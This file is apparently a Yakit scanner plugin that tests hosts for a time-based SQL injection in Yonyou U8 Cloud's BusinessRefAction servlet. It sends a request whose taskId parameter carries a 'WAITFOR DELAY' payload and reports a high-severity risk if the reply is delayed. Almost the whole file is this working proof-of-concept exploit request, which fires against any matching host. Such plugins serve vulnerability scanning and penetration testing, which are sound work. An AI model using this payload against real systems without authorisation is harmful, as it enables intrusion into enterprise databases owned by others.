# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close


`
    begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(5),
    )
    resp_time=time.Since(begin_time)
    //dump(rsp)

    if int(resp_time) > 5000000000{
        risk.NewRisk(
            target, risk.severity("high"),
            risk.title(f"用友U8 Cloud BusinessRefAction SQL注入 "),
            risk.titleVerbose("用友U8 Cloud BusinessRefAction 存在SQL注入漏洞"),
            risk.request(req),
            risk.response(rsp),
            risk.cve("no cve"),
            risk.details({
                "packet":string(packet1),
            }),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
